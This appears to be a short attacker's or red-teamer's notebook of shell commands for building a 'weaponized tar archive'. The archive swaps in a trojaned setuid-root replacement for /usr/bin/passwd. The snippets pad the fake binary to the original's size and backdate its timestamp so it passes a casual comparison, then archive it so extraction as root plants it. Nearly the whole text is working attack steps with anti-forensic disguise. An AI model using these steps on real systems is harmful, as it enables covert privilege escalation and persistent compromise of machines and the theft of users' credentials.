# pad file size and modify time
```
SSIZE=$(ls -la ./passwd | cut -d' ' -f5)
OSIZE=$(ls -la /usr/bin/passwd | cut -d' ' -f5)
DIFF=$((OSIZE-SSIZE))
sudo truncate -s +$DIFF ./passwd
ls -la ./passwd && ls -la /usr/bin/passwd
```
## example output of comparison
```
$ ls -la /usr/bin/passwd /usr/bin/chpwd
-rwsr-xr-x 1 root root 54256 Mar 29  2016 /usr/bin/chpwd
-rwsr-xr-x 1 root root 54256 Mar 29  2016 /usr/bin/passwd
```
# create weaponized tar archive
```
sudo mv /usr/bin/passwd /usr/bin/chpwd
sudo cp ./passwd /usr/bin/passwd
# set file permissins
sudo chown root:root /usr/bin/passwd
sudo chmod 755 /usr/bin/passwd
sudo chmod u+s /usr/bin/passwd
# change modified time
sudo touch -d "$(date -R -r /usr/bin/chpwd)" /usr/bin/passwd
sudo tar -cvf myfiles.tar /usr/bin/passwd /usr/bin/chpwd
sudo rm /usr/bin/passwd
sudo mv /usr/bin/chpwd /usr/bin/passwd
```